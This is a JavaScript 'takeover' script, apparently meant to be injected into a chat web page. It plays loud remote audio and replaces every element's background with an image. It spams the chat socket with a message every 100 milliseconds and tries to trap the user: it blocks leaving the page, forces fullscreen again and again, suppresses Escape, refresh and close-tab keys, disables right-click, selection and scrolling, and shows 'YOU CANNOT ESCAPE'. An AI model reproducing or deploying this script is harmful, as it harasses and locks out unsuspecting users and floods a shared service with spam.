// == SAMSUNG FUN CLUB TAKEOVER - WITH LOADING SOUND ==
(function(){
    // LOADING SOUND (plays during loading screen)
    let loadSound = new Audio('https://file.garden/aKc_7D_hWBm_xlj6/lostfrightenedconfused.mp3');
    loadSound.volume = 1;
    loadSound.play();

    // FULLSCREEN
    document.documentElement.requestFullscreen().catch(() => {});

    // LOADING SCREEN
    let overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;inset:0;z-index:999999;background:url(https://file.garden/aKc_7D_hWBm_xlj6/image_2026-07-17_023320144.png) 0 0/100% 100% no-repeat;display:flex;align-items:flex-end;justify-content:flex-end;padding:40px;';
    let barContainer = document.createElement('div');
    barContainer.style.cssText = 'width:300px;height:20px;background:#333;border-radius:10px;overflow:hidden;border:2px solid #fff;';
    let barFill = document.createElement('div');
    barFill.style.cssText = 'width:0%;height:100%;background:linear-gradient(90deg,#ff0000,#ffcc00);transition:width .3s;';
    barContainer.appendChild(barFill);
    overlay.appendChild(barContainer);
    document.body.appendChild(overlay);

    // PROGRESS BAR ANIMATION
    let progress = 0;
    let interval = setInterval(() => {
        progress += Math.random() * 8 + 2;
        if (progress >= 100) {
            progress = 100;
            clearInterval(interval);
            setTimeout(() => {
                overlay.remove();
                loadSound.pause();
                loadSound.currentTime = 0;

                // SAMSUNG AUDIO
                let s = new Audio('https://cdn.discordapp.com/attachments/1520866712780537866/1527484569220022282/samsungfunclub.mp3?ex=6a5ad45c&is=6a5982dc&hm=dd157ea447bd54cf7a1dd4c1f1d3375bf437b151fd7c2b80e06b9682e09e48e5');
                s.loop = true;
                s.volume = 1;
                s.play();

                // SAMSUNGIFY EVERYTHING
                document.querySelectorAll('*').forEach(el => {
                    if (el.tagName !== 'BODY' && el.tagName !== 'HTML') {
                        el.style.background = 'url(https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR-LOTOzpubC0La-wHKqpqn3KVS1aJkUGP3sGtLC1RP1w&s=10) 0 0/100% 100% no-repeat';
                    }
                });

                // SPAM
                setInterval(() => {
                    socket.emit('talk', { text: 'SAMSUNG FUN CLUB' });
                }, 100);

                // UNCLOSABLE
                window.onbeforeunload = () => 'NO. YOU STAY.';

                // LOCK SCROLL
                document.body.style.overflow = 'hidden';

                // BARRIER OVERLAY
                let barrier = document.createElement('div');
                barrier.style.cssText = 'position:fixed;inset:0;z-index:999998;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;font-size:40px;color:#fff;font-weight:700;text-shadow:0 0 20px #000;pointer-events:all;';
                barrier.innerHTML = 'SAMSUNG FUN CLUB<br><span style="font-size:20px;">YOU CANNOT ESCAPE</span>';
                document.body.appendChild(barrier);

                // TAB SWITCH TRAP
                document.addEventListener('visibilitychange', () => {
                    if (document.hidden) {
                        alert('NO. YOU STAY.');
                        setTimeout(() => {
                            document.title = 'NO. YOU STAY.';
                            document.documentElement.requestFullscreen().catch(() => {});
                        }, 100);
                    }
                });

                // KEYBOARD LOCK
                document.addEventListener('keydown', e => {
                    if (e.key === 'Escape' || e.key === 'F11') {
                        e.preventDefault();
                        alert('NO. YOU STAY.');
                    }
                    if (e.ctrlKey && e.shiftKey && (e.key === 'R' || e.key === 'r')) {
                        e.preventDefault();
                        alert('NO. YOU STAY.');
                    }
                    if (e.ctrlKey && (e.key === 'w' || e.key === 'W')) {
                        e.preventDefault();
                        alert('NO. YOU STAY.');
                    }
                    if (e.key === 'F5' || (e.ctrlKey && e.key === 'r')) {
                        e.preventDefault();
                        alert('NO. YOU STAY.');
                    }
                });

                // FULLSCREEN LOCK
                document.addEventListener('fullscreenchange', () => {
                    if (!document.fullscreenElement) {
                        document.documentElement.requestFullscreen().catch(() => {});
                    }
                });

                setInterval(() => {
                    if (!document.fullscreenElement) {
                        document.documentElement.requestFullscreen().catch(() => {});
                    }
                }, 1000);

                // MOUSE LEAVE TRAP
                document.addEventListener('mouseleave', () => {
                    setTimeout(() => {
                        document.documentElement.requestFullscreen().catch(() => {});
                    }, 50);
                });

                // DISABLE RIGHT CLICK
                document.addEventListener('contextmenu', e => e.preventDefault());
                document.addEventListener('selectstart', e => e.preventDefault());
                document.addEventListener('dragstart', e => e.preventDefault());

                // SCROLL LOCK
                setInterval(() => {
                    window.scrollTo(0, 0);
                    if (document.activeElement) document.activeElement.blur();
                }, 100);

            }, 300);
        }
        barFill.style.width = progress + '%';
    }, 300);
})();
